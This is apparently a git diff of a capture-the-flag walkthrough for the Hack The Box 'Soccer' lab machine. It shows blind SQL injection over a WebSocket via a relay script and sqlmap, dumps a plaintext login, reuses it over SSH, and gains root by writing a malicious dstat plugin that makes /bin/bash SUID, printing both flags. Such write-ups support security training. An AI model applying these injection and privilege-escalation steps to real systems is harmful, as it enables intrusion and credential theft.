@@ -1,3 +1,9 @@
+---
+layout: default
+---
+
+
+
 * Hack the Box Machine Resources
 
 ** Here the solution of machines from Hack The Box
@@ -211,7 +217,8 @@ the source code reveals this
 
 
 FOLLOW: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
-
+* pip install websocket
+* pip3 install websocket-client
 
 
 ``` python
@@ -221,7 +228,7 @@ from http.server import SimpleHTTPRequestHandler
    3   │ from urllib.parse import unquote, urlparse
    4   │ from websocket import create_connection
    5   │ 
-   6   │ #ws_server = "ws://localhost:8156/ws"
+   6   │ #ws_server = "ws://localhost:8156/ws"**CHANGE**
    7   │ ws_server = "ws://soc-player.soccer.htb:9091"
    8   │ 
    9   │ def send_ws(payload):
@@ -232,7 +239,7 @@ from http.server import SimpleHTTPRequestHandler
   14   │     # For our case, format the payload in JSON
   15   │     message = unquote(payload).replace('"','\'') # replacing " with ' to avoi
        │ d breaking JSON structure
-         # data = '{"employeeID":"%s"}' % message-->
+         # data = '{"employeeID":"%s"}' % message **CHANGE**
   16   │   data = '{"id":"%s"}' % message
   17   │ 
   18   │     ws.send(data)
@@ -245,7 +252,214 @@ from http.server import SimpleHTTPRequestHandler
   25   │         return ''
 
 ```
+* In one terminal we fire the exploit
+* In another terminal we fire the sqlmap as shown below
 
-* pip install websocket
-* pip3 install websocket-client
+_terminal1_
+```
+❯ python3 sqliserver.py
+```
+_terminal2_
+```
+❯ sqlmap -u "http://localhost:8081/?id=1" -p "id" --dbs
+```
+![image](./assets/img/sqliServerExploit.png)
 
+
+``` bash
+❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -tables
+```
+
+``` bash
+[20:20:54] [INFO] retrieved: 
+[20:21:05] [INFO] adjusting time delay to 2 seconds due to good response times
+accounts
+Database: soccer_db
+[1 table]
++----------+
+| accounts |
++----------+
+´´´
+``` bash
+❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
+```
+
+``` bash
+[20:28:54] [INFO] retrieved: 
+[20:29:05] [INFO] adjusting time delay to 2 seconds due to good response times
+email
+[20:29:41] [INFO] retrieved: varchar(40)
+[20:31:25] [INFO] retrieved: id
+[20:31:44] [INFO] retrieved: int
+[20:32:16] [INFO] retrieved: password
+[20:33:34] [INFO] retrieved: varchar(40)
+[20:35:16] [INFO] retrieved: username
+[20:36:24] [INFO] retrieved: varchar(40)
+Database: soccer_db
+Table: accounts
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | varchar(40) |
+| id       | int         |
+| password | varchar(40) |
+| username | varchar(40) |
++----------+-------------+
+
+```
+
+``` bash
+❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
+```
+``` bash
+[20:42:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+[20:42:29] [INFO] adjusting time delay to 3 seconds due to good response times
+PlayerOftheMatch2022
+[20:46:15] [INFO] retrieved: player
+Database: soccer_db
+Table: accounts
+[1 entry]
++----------+----------------------+
+| username | password             |
++----------+----------------------+
+| player   | PlayerOftheMatch2022 |
++----------+----------------------+
+```
+``` bash
+❯ ssh player@10.10.11.194
+The authenticity of host '10.10.11.194 (10.10.11.194)' can't be established.
+ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.194' (ED25519) to the list of known hosts.
+player@10.10.11.194's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jan 11 19:48:38 UTC 2023
+
+  System load:           0.0
+  Usage of /:            70.3% of 3.84GB
+  Memory usage:          26%
+  Swap usage:            0%
+  Processes:             240
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.194
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:457a
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jan 11 18:10:14 2023 from 10.10.14.82
+-bash-5.0$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+-bash-5.0$ pwd
+/home/player
+-bash-5.0$ ls -la
+total 44
+drwxr-xr-x 6 player player 4096 Jan 11 18:19 .
+drwxr-xr-x 3 root   root   4096 Nov 17 09:25 ..
+lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .bash_history -> /dev/null
+-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
+drwx------ 2 player player 4096 Nov 17 09:00 .cache
+drwx------ 3 player player 4096 Jan 11 17:48 .gnupg
+drwxrwxr-x 3 player player 4096 Jan 11 18:10 .local
+-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
+-rw------- 1 player player 3783 Jan 11 18:19 .viminfo
+drwx------ 3 player player 4096 Jan 11 17:45 snap
+-rw-r----- 1 root   player   33 Jan 11 17:20 user.txt
+-bash-5.0$ cat user.txt 
+d4b703352cd192b19e6983733bcf72c2
+-bash-5.0$ 
+```
+Looking for binaries suid we found this _doas_?
+
+``` bash
+-bash-5.0$ find / -perm -4000 2>/dev/null
+**/usr/local/bin/doas**
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+...
+
+-bash-5.0$ 
+```
+We end up finding
+* /usr/local/etc/doas.conf
+* We can execute dstat as root with no password
+``` bash
+bash-5.0$ cat doas.conf 
+permit nopass player as root cmd /usr/bin/dstat
+bash-5.0$ / 
+```
+``` bash
+ash-5.0$  doas -u root /usr/bin/dstat
+You did not select any stats, using -cdngy by default.
+Color support is disabled as curses does not find terminal "xterm-kitty".
+--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
+usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw 
+  2   1  97   0   0|  56k   17k|   0     0 |   0     0 | 349   577 
+  0   0 100   0   0|   0     0 | 198B  310B|   0     0 | 264   495 
+  0   0  99   0   0|   0     0 | 272B  325B|   0     0 | 246   489 
+  1   0  99   0   0|   0     0 |  66B  174B|   0     0 | 228   458 
+  1   0  99   0   0|   0     0 | 254B  348B|   0     0 | 267   490 
+  0   1  99   0   0|   0    40k|  66B  174B|   0     0 | 242   462 
+  0   0  99   0   0|   0     0 |  66B  174B|   0     0 | 230   456 
+  1   0  99   0   0|   0     0 |  66B  174B|   0     0 | 246   469 
+  0   1  99   0   0|   0     0 |  66B  174B|   0     0 | 233   458 
+  0   1  99   1   0|   0   604k|  66B  174B|   0     0 | 328   520 ^C
+bash-5.0$ 
+
+```
+* We have write permissions in /usr/local/share/dstat 
+* This is the directory plugins are stored
+``` bash
+bash-5.0$ ls -la /usr/local/share/dstat
+total 8
+drwxrwx--- 2 root player 4096 Jan 11 18:21 .
+drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
+bash-5.0$ 
+```
+* We create a plugin as so 
+* Then we execute it as root
+
+``` bash
+bash-5.0$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
+bash-5.0$ ls
+dstat_privesc.py  snap	user.txt
+bash-5.0$ doas -u root /usr/bin/dstat --privesc &>/dev/null
+bash-5.0$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+bash-5.0$ bash -p
+bash-5.0# whoami
+root
+```
+``` bash
+bash-5.0# pwd
+/root
+bash-5.0# ls
+app  root.txt  run.sql	snap
+bash-5.0# cat root.txt 
+be6452f04ab32a00e90f437dffc6cb94
+```
+
+And we've got the flag!
